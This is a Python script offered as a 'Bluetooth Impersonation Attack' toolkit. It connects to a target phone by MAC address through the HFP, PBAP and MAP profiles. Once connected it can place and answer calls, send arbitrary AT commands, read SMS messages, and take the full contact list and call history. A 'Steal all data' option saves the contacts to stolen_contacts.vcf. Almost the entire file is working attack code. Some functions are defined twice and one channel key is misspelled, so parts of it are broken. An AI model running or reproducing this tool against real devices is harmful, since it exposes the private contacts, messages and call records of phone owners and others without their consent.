#!/usr/bin/env python3
"""
Bluetooth Impersonation Attack Demo
Supports HFP (calls), PBAP (contacts), and MAP (messages)
"""
import socket
import sys
import time
import subprocess
import re 


class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'

def print_banner():
    print(f"{Colors.HEADER}")
    print("=" * 60)
    print("  BLUETOOTH IMPERSONATION ATTACK TOOLKIT")
    print("  HFP | PBAP | MAP Access via Spoofed Device")
    print("=" * 60)
    print(f"{Colors.ENDC}\n")



def discover_channels(mac_address):
    """Use sdptool to discover service channels"""
    print(f"{Colors.OKCYAN}[*] Discovering services on {mac_address}...{Colors.ENDC}")
    result = subprocess.run(
        ["sdptool", "browse", mac_address],
        capture_output=True, text=True
    )
    
    channels = {
        'hfp': 4,    # defaults
        'pbap': 19,
        'map': 26
    }
    
    current_service = None
    for line in result.stdout.splitlines():
        if 'Handsfree Audio Gateway' in line or 'Handsfree Gateway' in line:
            current_service = 'hfp'
        elif 'Phonebook Access' in line or 'OBEX Phonebook' in line:
            current_service = 'pbap'
        elif 'SMS/MMS' in line or 'Message Access' in line:
            current_service = 'map'
        
        if current_service:
            m = re.search(r'Channel:\s*(\d+)', line)
            if m:
                channels[current_service] = int(m.group(1))
                print(f"{Colors.OKGREEN}[+] {current_service.upper()} on channel {channels[current_service]}{Colors.ENDC}")
                current_service = None
    
    return channels




def obex_connect(sock, target_uuid=None):
    if target_uuid:
        target_header = bytes([0x46, 0x00, 0x13]) + target_uuid
        packet_len = 7 + len(target_header)
        connect = bytes([
            0x80,
            (packet_len >> 8) & 0xFF, packet_len & 0xFF,
            0x10, 0x00,
            0xFF, 0xFF  # max packet size — use 0xFFFF for iPhone
        ]) + target_header
    else:
        connect = bytes([0x80, 0x00, 0x07, 0x10, 0x00, 0xFF, 0xFF])

    sock.send(connect)
    resp = sock.recv(1024)
    if resp[0] != 0xA0:
        return None

    # Parse Connection ID from response (header 0xCB)
    conn_id = None
    i = 7  # skip response code, length, version, flags, max packet
    while i < len(resp) - 4:
        if resp[i] == 0xCB:  # Connection ID header
            conn_id = (resp[i+1] << 24) | (resp[i+2] << 16) | (resp[i+3] << 8) | resp[i+4]
            break
        i += 1

    return conn_id  # None means no conn_id but connected, check resp[0]


def obex_get_with_type(sock, type_str, name=None, conn_id=None):
    headers = b''

    # Connection ID header (0xCB) — required by iPhone
    if conn_id is not None:
        headers += bytes([
            0xCB,
            (conn_id >> 24) & 0xFF,
            (conn_id >> 16) & 0xFF,
            (conn_id >> 8) & 0xFF,
            conn_id & 0xFF
        ])

    # Type header
    type_bytes = type_str.encode('utf-8') + b'\x00'
    type_len = 3 + len(type_bytes)
    headers += bytes([0x42, (type_len >> 8) & 0xFF, type_len & 0xFF]) + type_bytes

    # Name header
    if name is not None:
        name_unicode = b''.join(bytes([0x00, ord(c)]) for c in name) + b'\x00\x00'
        name_len = 3 + len(name_unicode)
        headers += bytes([0x01, (name_len >> 8) & 0xFF, name_len & 0xFF]) + name_unicode

    packet_len = 3 + len(headers)
    packet = bytes([0x83, (packet_len >> 8) & 0xFF, packet_len & 0xFF]) + headers
    sock.send(packet)

    data = b''
    while True:
        try:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
            status = data[0]
            if status == 0xA0:
                break
            elif status == 0x90:  # continue
                # send empty GET with just connection ID
                if conn_id is not None:
                    cont = bytes([0xCB,
                        (conn_id >> 24) & 0xFF,
                        (conn_id >> 16) & 0xFF,
                        (conn_id >> 8) & 0xFF,
                        conn_id & 0xFF
                    ])
                    cont_pkt = bytes([0x83, 0x00, 0x03 + len(cont)]) + cont
                    sock.send(cont_pkt)
                else:
                    sock.send(bytes([0x83, 0x00, 0x03]))
                data = b''  # reset for next chunk
            elif status >= 0xC0:
                break  # error
        except:
            break
    return data


def obex_setpath_fixed(sock, folder_name, conn_id=None):
    conn_hdr = b''
    if conn_id is not None:
        conn_hdr = bytes([
            0xCB,
            (conn_id >> 24) & 0xFF,
            (conn_id >> 16) & 0xFF,
            (conn_id >> 8) & 0xFF,
            conn_id & 0xFF
        ])

    if folder_name == "":
        name_hdr = bytes([0x01, 0x00, 0x05, 0x00, 0x00])
        packet_len = 5 + len(conn_hdr) + len(name_hdr)
        packet = bytes([
            0x85,
            (packet_len >> 8) & 0xFF, packet_len & 0xFF,
            0x02, 0x00
        ]) + conn_hdr + name_hdr
    else:
        name_unicode = b''.join(bytes([0x00, ord(c)]) for c in folder_name) + b'\x00\x00'
        name_hdr_len = 3 + len(name_unicode)
        name_hdr = bytes([0x01, (name_hdr_len >> 8) & 0xFF, name_hdr_len & 0xFF]) + name_unicode
        packet_len = 5 + len(conn_hdr) + len(name_hdr)
        packet = bytes([
            0x85,
            (packet_len >> 8) & 0xFF, packet_len & 0xFF,
            0x02, 0x00
        ]) + conn_hdr + name_hdr

    sock.send(packet)
    resp = sock.recv(1024)
    return resp[0] == 0xA0











# ============= HFP Functions =============
def send_at_command(sock, cmd, description=""):
    """Send AT command and return response"""
    if description:
        print(f"{Colors.OKCYAN}[*] {description}{Colors.ENDC}")
    
    msg = f"{cmd}\r\n"
    sock.send(msg.encode())
    time.sleep(0.5)
    
    response = sock.recv(4096).decode('utf-8', errors='ignore')
    print(f"{Colors.OKBLUE}{response.strip()}{Colors.ENDC}")
    return response

# ============= OBEX Functions =============
def obex_connect(sock, target_uuid=None):
    """Send OBEX Connect packet with optional TARGET header"""
    if target_uuid:
        # OBEX Connect with TARGET header
        # Target header: 0x46 (ID) + length (2 bytes) + UUID (16 bytes)
        target_header = bytes([0x46, 0x00, 0x13]) + target_uuid
        packet_len = 7 + len(target_header)
        connect = bytes([
            0x80,  # Connect
            (packet_len >> 8) & 0xFF, packet_len & 0xFF,
            0x10,  # OBEX version 1.0
            0x00,  # Flags
            0x20, 0x00  # Max packet 8192 (not 65535)
        ]) + target_header
    else:
        # Simple connect
        connect = bytes([0x80, 0x00, 0x07, 0x10, 0x00, 0x20, 0x00])
    
    sock.send(connect)
    resp = sock.recv(1024)
    return resp[0] == 0xA0
def obex_disconnect(sock):
    """Send OBEX Disconnect"""
    disconnect = bytes([0x81, 0x00, 0x03])
    sock.send(disconnect)
    sock.recv(1024)

def obex_setpath(sock, folder_name):
    """Navigate to folder"""
    if not folder_name:
        # Go to root
        packet = bytes([0x85, 0x00, 0x05, 0x02, 0x00, 0x00, 0x00])
    else:
        # Convert to Unicode (UTF-16BE with null bytes between chars)
        name_unicode = b''.join(bytes([0x00, ord(c)]) for c in folder_name) + b'\x00\x00'
        
        header_len = 3 + len(name_unicode)
        packet_len = 5 + header_len
        
        packet = bytes([
            0x85,  # SetPath
            (packet_len >> 8) & 0xFF, packet_len & 0xFF,  # Length
            0x02, 0x00,  # Flags: don't create, navigate down
            0x00, 0x00,  # Constants
            0x01,  # Name header ID
            (header_len >> 8) & 0xFF, header_len & 0xFF  # Name header length
        ]) + name_unicode
    
    sock.send(packet)
    resp = sock.recv(1024)
    return resp[0] == 0xA0

def obex_get(sock, filename):
    """Get a file via OBEX"""
    name_unicode = b''.join(bytes([0x00, ord(c)]) for c in filename) + b'\x00\x00'
    
    header_len = 3 + len(name_unicode)
    packet_len = 3 + header_len
    
    packet = bytes([
        0x83,  # Get
        (packet_len >> 8) & 0xFF, packet_len & 0xFF,
        0x01,  # Name header
        (header_len >> 8) & 0xFF, header_len & 0xFF
    ]) + name_unicode
    
    sock.send(packet)
    
    # Read all response data
    data = b''
    while True:
        try:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
            # Check if this is the final packet (status 0xA0 = success)
            if len(chunk) < 4096 and data[0] in [0xA0, 0x90]:
                break
        except:
            break
    
    return data

def extract_vcard_data(data):
    """Extract vCard content from OBEX response"""
    # Find Body header (0x48 or 0x49)
    body_start = -1
    for i in range(len(data) - 3):
        if data[i] in [0x48, 0x49]:  # Body or End-of-Body
            # Next 2 bytes are length
            body_len = (data[i+1] << 8) | data[i+2]
            body_start = i + 3
            break
    
    if body_start != -1:
        vcard_data = data[body_start:].decode('utf-8', errors='ignore')
        return vcard_data
    
    # Fallback: search for BEGIN:VCARD
    text = data.decode('utf-8', errors='ignore')
    start = text.find('BEGIN:VCARD')
    if start != -1:
        return text[start:]
    
    return None




def hfp_menu(mac_address, channel=4):
    print(f"\n{Colors.HEADER}=== HFP (Hands-Free Profile) ==={Colors.ENDC}")
    sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_STREAM, socket.BTPROTO_RFCOMM)
    try:
        print(f"{Colors.OKCYAN}[*] Connecting to HFP (channel {channel})...{Colors.ENDC}")
        sock.connect((mac_address, channel))
        print(f"{Colors.OKGREEN}[+] Connected!{Colors.ENDC}\n")

        # Full SLC establishment - iPhone requires all of these in order
        send_at_command(sock, "AT+BRSF=2079", "Exchanging features...")
        send_at_command(sock, "AT+CIND=?", "Querying indicator format...")
        send_at_command(sock, "AT+CIND?", "Querying indicator values...")
        send_at_command(sock, "AT+CMER=3,0,0,1", "Enabling indicator reporting...")
        send_at_command(sock, "AT+CHLD=?", "Querying call hold support...")
        send_at_command(sock, "AT+CLIP=1", "Enabling caller ID...")
        send_at_command(sock, "AT+CCWA=1", "Enabling call waiting...")
        time.sleep(0.5)
        print(f"{Colors.OKGREEN}[+] SLC established{Colors.ENDC}\n")

        while True:
            print(f"\n{Colors.BOLD}HFP Commands:{Colors.ENDC}")
            print("  1. Get phone status")
            print("  2. Get carrier info")
            print("  3. Make a call")
            print("  4. Hang up call")
            print("  5. Answer call")
            print("  6. Send custom AT command")
            print("  0. Back to main menu")

            choice = input(f"\n{Colors.OKCYAN}Choice> {Colors.ENDC}").strip()

            if choice == '1':
                send_at_command(sock, "AT+CIND?", "Getting phone status...")
            elif choice == '2':
                send_at_command(sock, "AT+COPS=3,0", "Setting operator format...")
                time.sleep(0.3)
                send_at_command(sock, "AT+COPS?", "Getting carrier info...")
            elif choice == '3':
                number = input("Enter phone number: ").strip()
                send_at_command(sock, f"ATD{number};", f"Calling {number}...")
            elif choice == '4':
                send_at_command(sock, "AT+CHUP", "Hanging up...")
            elif choice == '5':
                send_at_command(sock, "ATA", "Answering call...")
            elif choice == '6':
                cmd = input("Enter AT command: ").strip()
                send_at_command(sock, cmd)
            elif choice == '0':
                break
            else:
                print(f"{Colors.FAIL}Invalid choice{Colors.ENDC}")

    except Exception as e:
        print(f"{Colors.FAIL}[!] Error: {e}{Colors.ENDC}")
    finally:
        sock.close()


















def pbap_menu(mac_address,channel=19):
    """PBAP Interactive Menu"""
    print(f"\n{Colors.HEADER}=== PBAP (Phone Book Access Profile) ==={Colors.ENDC}")
    
    sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_STREAM, socket.BTPROTO_RFCOMM)
    
    try:
        print(f"{Colors.OKCYAN}[*] Connecting to PBAP (channel {channel})...{Colors.ENDC}")
        sock.connect((mac_address, channel))
        print(f"{Colors.OKGREEN}[+] Connected!{Colors.ENDC}")

  
    # PBAP TARGET UUID: 796135f0-f0c5-11d8-0966-0800200c9a66
   #     PBAP_TARGET = bytes([
   #         0x79, 0x61, 0x35, 0xf0, 0xf0, 0xc5, 0x11, 0xd8,
   #         0x09, 0x66, 0x08, 0x00, 0x20, 0x0c, 0x9a, 0x66
   #     ])

                # PBAP TARGET UUID in correct byte order
        PBAP_TARGET = bytes([
            0x79, 0x61, 0x35, 0xF0,
            0xF0, 0xC5,
            0x11, 0xD8,
            0x09, 0x66,
            0x08, 0x00, 0x20, 0x0C, 0x9A, 0x66
        ])
    
        if not obex_connect(sock, PBAP_TARGET):
            print(f"{Colors.FAIL}[!] OBEX handshake failed{Colors.ENDC}")
            return
        
        print(f"{Colors.OKGREEN}[+] OBEX handshake successful{Colors.ENDC}\n")
        
        while True:
            print(f"\n{Colors.BOLD}PBAP Commands:{Colors.ENDC}")
            print("  1. Get all contacts (pb.vcf)")
            print("  2. Get incoming call history (ich.vcf)")
            print("  3. Get outgoing call history (och.vcf)")
            print("  4. Get missed calls (mch.vcf)")
            print("  5. Get combined call history (cch.vcf)")
            print("  0. Back to main menu")
            
            choice = input(f"\n{Colors.OKCYAN}Choice> {Colors.ENDC}").strip()
            
            if choice == '0':
                break
            
            files = {
                '1': ('pb.vcf', 'contacts'),
                '2': ('ich.vcf', 'incoming calls'),
                '3': ('och.vcf', 'outgoing calls'),
                '4': ('mch.vcf', 'missed calls'),
                '5': ('cch.vcf', 'combined call history')
            }
            
            if choice in files:
                filename, desc = files[choice]
                
                print(f"{Colors.OKCYAN}[*] Navigating to telecom/pb...{Colors.ENDC}")
                if obex_setpath(sock, "telecom"):
                    if obex_setpath(sock, "pb"):
                        print(f"{Colors.OKCYAN}[*] Getting {desc}...{Colors.ENDC}")
                        data = obex_get(sock, filename)
                        
                        vcards = extract_vcard_data(data)
                        if vcards:
                            print(f"\n{Colors.OKGREEN}=== {desc.upper()} ==={Colors.ENDC}")
                            print(vcards[:2000])  # Print first 2000 chars
                            if len(vcards) > 2000:
                                print(f"\n{Colors.WARNING}[...truncated, {len(vcards)} total chars]{Colors.ENDC}")
                            
                            # Ask to save
                            save = input(f"\n{Colors.OKCYAN}Save to file? (y/n): {Colors.ENDC}").lower()
                            if save == 'y':
                                with open(filename, 'w') as f:
                                    f.write(vcards)
                                print(f"{Colors.OKGREEN}[+] Saved to {filename}{Colors.ENDC}")
                        else:
                            print(f"{Colors.WARNING}[!] No data received or parsing failed{Colors.ENDC}")
                            print(f"Raw response (first 100 bytes): {data[:100].hex()}")
                        
                        # Go back to root for next operation
                        obex_setpath(sock, "")
                        obex_setpath(sock, "")
            else:
                print(f"{Colors.FAIL}Invalid choice{Colors.ENDC}")
    
    except Exception as e:
        print(f"{Colors.FAIL}[!] Error: {e}{Colors.ENDC}")
        import traceback
        traceback.print_exc()
    finally:
        try:
            obex_disconnect(sock)
        except:
            pass
        sock.close()



def obex_get_with_type(sock, type_str, name=None):
    """OBEX GET with mandatory Type header (required for MAP)"""
    headers = b''
    
    # Type header: 0x42
    type_bytes = type_str.encode('utf-8') + b'\x00'
    type_len = 3 + len(type_bytes)
    headers += bytes([0x42, (type_len >> 8) & 0xFF, type_len & 0xFF]) + type_bytes
    
    # Name header (optional)
    if name is not None:
        name_unicode = b''.join(bytes([0x00, ord(c)]) for c in name) + b'\x00\x00'
        name_len = 3 + len(name_unicode)
        headers += bytes([0x01, (name_len >> 8) & 0xFF, name_len & 0xFF]) + name_unicode
    
    packet_len = 3 + len(headers)
    packet = bytes([0x83, (packet_len >> 8) & 0xFF, packet_len & 0xFF]) + headers
    sock.send(packet)
    
    data = b''
    while True:
        try:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
            if data[0] in [0xA0, 0xC0]:  # success or error
                break
            if data[0] == 0x90:  # continue - need to send empty GET
                sock.send(bytes([0x83, 0x00, 0x03]))
        except:
            break
    return data


def obex_setpath_fixed(sock, folder_name):
    """Fixed SetPath - handles root, up, and down correctly"""
    if folder_name == "":
        # Go to root: flags=0x02 (bit1=1, don't create), empty name
        packet = bytes([
            0x85,           # SetPath
            0x00, 0x08,     # length = 8
            0x02, 0x00,     # flags: go to root (bit0=0), bit1=1
            0x01,           # Name header
            0x00, 0x05,     # name header length (3 + 2 for null terminator)
            0x00, 0x00      # empty unicode string
        ])
    else:
        name_unicode = b''.join(bytes([0x00, ord(c)]) for c in folder_name) + b'\x00\x00'
        name_hdr_len = 3 + len(name_unicode)
        packet_len = 5 + name_hdr_len
        packet = bytes([
            0x85,
            (packet_len >> 8) & 0xFF, packet_len & 0xFF,
            0x02, 0x00,     # flags: go down (bit0=0, bit1=1)
            0x01,
            (name_hdr_len >> 8) & 0xFF, name_hdr_len & 0xFF
        ]) + name_unicode
    
    sock.send(packet)
    resp = sock.recv(1024)
    return resp[0] == 0xA0


def map_menu(mac_address,channel=26):
    """MAP Interactive Menu"""
    print(f"\n{Colors.HEADER}=== MAP (Message Access Profile) ==={Colors.ENDC}")

    sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_STREAM, socket.BTPROTO_RFCOMM)

    try:
        print(f"{Colors.OKCYAN}[*] Connecting to MAP (channel 26)...{Colors.ENDC}")
        sock.connect((mac_address, channel))
        print(f"{Colors.OKGREEN}[+] Connected!{Colors.ENDC}")

        MAP_TARGET = bytes([
            0xbb, 0x58, 0x2b, 0x40, 0x42, 0x0c, 0x11, 0xdb,
            0xb0, 0xde, 0x08, 0x00, 0x20, 0x0c, 0x9a, 0x66
        ])

        if not obex_connect(sock, MAP_TARGET):
            print(f"{Colors.FAIL}[!] OBEX handshake failed{Colors.ENDC}")
            return

        print(f"{Colors.OKGREEN}[+] OBEX handshake successful{Colors.ENDC}\n")

        while True:
            print(f"\n{Colors.BOLD}MAP Commands:{Colors.ENDC}")
            print("  1. List root folders")
            print("  2. List messages in inbox")
            print("  3. Get message by handle")
            print("  0. Back to main menu")

            choice = input(f"\n{Colors.OKCYAN}Choice> {Colors.ENDC}").strip()

            if choice == '0':
                break

            elif choice == '1':
                print(f"{Colors.OKCYAN}[*] Getting folder listing...{Colors.ENDC}")
                data = obex_get_with_type(sock, 'x-obex/folder-listing')
                text = data.decode('utf-8', errors='ignore')
                start = text.find('<')
                if start != -1:
                    print(f"{Colors.OKGREEN}{text[start:]}{Colors.ENDC}")
                else:
                    print(f"Raw: {data[:200].hex()}")

            elif choice == '2':
                print(f"{Colors.OKCYAN}[*] Navigating to telecom/msg/inbox...{Colors.ENDC}")
                if obex_setpath_fixed(sock, "telecom") and \
                   obex_setpath_fixed(sock, "msg") and \
                   obex_setpath_fixed(sock, "inbox"):
                    print(f"{Colors.OKCYAN}[*] Getting messages listing...{Colors.ENDC}")
                    data = obex_get_with_type(sock, 'x-bt/MAP-msg-listing')
                    text = data.decode('utf-8', errors='ignore')
                    start = text.find('<')
                    if start != -1:
                        print(f"{Colors.OKGREEN}{text[start:]}{Colors.ENDC}")
                    else:
                        print(f"Raw: {data[:200].hex()}")
                else:
                    print(f"{Colors.FAIL}[!] SetPath failed{Colors.ENDC}")
            elif choice == '3':
                handle = input("Enter message handle (hex, e.g. 0000000000000001): ").strip()
                print(f"{Colors.OKCYAN}[*] Getting message {handle}...{Colors.ENDC}")
                data = obex_get_with_type(sock, 'x-bt/message', name=handle)
                text = data.decode('utf-8', errors='ignore')
                start = text.find('BEGIN:BMSG')
                if start != -1:
                    print(f"{Colors.OKGREEN}{text[start:]}{Colors.ENDC}")
                else:
                    print(f"Raw: {data[:200].hex()}")

    except Exception as e:
        print(f"{Colors.FAIL}[!] Error: {e}{Colors.ENDC}")
        import traceback
        traceback.print_exc()
    finally:
        try:
            obex_disconnect(sock)
        except:
            pass
        sock.close()           


def main_menu(mac_address):
    print_banner()
    print(f"{Colors.OKGREEN}Target: {mac_address}{Colors.ENDC}\n")
    
    channels = discover_channels(mac_address)

    while True:
        print(f"\n{Colors.BOLD}Main Menu:{Colors.ENDC}")
        print(f"  1. HFP  - Hands-Free (channel {channels['hfp']})")
        print(f"  2. PBAP - Phone Book Access (channel {channels['pbap']})")
        print(f"  3. MAP  - Message Access (channel {channels['map']})")
        print("  4. Quick Demo - Steal all data")
        print("  0. Exit")

        choice = input(f"\n{Colors.OKCYAN}Choice> {Colors.ENDC}").strip()

        if choice == '1':
            hfp_menu(mac_address, channels['hfp'])
        elif choice == '2':
            pbap_menu(mac_address, channels['pbap'])
        elif choice == '3':
            map_menu(mac_address, channels['map'])
        elif choice == '4':
            quick_demo(mac_address, channels)
        elif choice == '0':
            print(f"\n{Colors.OKCYAN}Goodbye!{Colors.ENDC}")
            break
        else:
            print(f"{Colors.FAIL}Invalid choice{Colors.ENDC}")





def quick_demo(mac_address,channels):
    """Quick demonstration - steal everything"""
    print(f"\n{Colors.WARNING}=== QUICK DEMO - Data Extraction ==={Colors.ENDC}\n")
    
    # 1. HFP - Get basic info
    print(f"{Colors.HEADER}[1/2] HFP - Phone Status{Colors.ENDC}")
    try:
        sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_STREAM, socket.BTPROTO_RFCOMM)
        sock.connect((mac_address, channels['hfp']))
        send_at_command(sock, "AT+BRSF=2079")
        send_at_command(sock, "AT+CIND?", "Phone status:")
        send_at_command(sock, "AT+COPS?", "Carrier:")
        send_at_command(sock, "AT+CPBR=1,10", "First 10 contacts:")
        sock.close()
    except Exception as e:
        print(f"{Colors.FAIL}HFP failed: {e}{Colors.ENDC}")
    
    # 2. PBAP - Get full phonebook
    print(f"\n{Colors.HEADER}[2/2] PBAP - Full Phonebook{Colors.ENDC}")
    try:
        sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_STREAM, socket.BTPROTO_RFCOMM)
        sock.connect((mac_address, channels['pbabp']))
        
        if obex_connect(sock):
            if obex_setpath(sock, "telecom") and obex_setpath(sock, "pb"):
                data = obex_get(sock, "pb.vcf")
                vcards = extract_vcard_data(data)
                
                if vcards:
                    with open("stolen_contacts.vcf", "w") as f:
                        f.write(vcards)
                    
                    # Count contacts
                    count = vcards.count("BEGIN:VCARD")
                    print(f"{Colors.OKGREEN}[+] Extracted {count} contacts{Colors.ENDC}")
                    print(f"{Colors.OKGREEN}[+] Saved to stolen_contacts.vcf{Colors.ENDC}")
                else:
                    print(f"{Colors.WARNING}[!] No vCard data extracted{Colors.ENDC}")
        
        obex_disconnect(sock)
        sock.close()
    except Exception as e:
        print(f"{Colors.FAIL}PBAP failed: {e}{Colors.ENDC}")
    
    print(f"\n{Colors.OKGREEN}=== Demo Complete ==={Colors.ENDC}")

def main():
    if len(sys.argv) < 2:
        print("Usage: sudo python3 bt_attack.py <MAC_ADDRESS>")
        print("Example: sudo python3 bt_attack.py 20:36:D0:9F:60:34")
        sys.exit(1)
    
    mac_address = sys.argv[1]
    
    try:
        main_menu(mac_address)
    except KeyboardInterrupt:
        print(f"\n\n{Colors.OKCYAN}Interrupted by user{Colors.ENDC}")
    except Exception as e:
        print(f"\n{Colors.FAIL}Fatal error: {e}{Colors.ENDC}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    main()
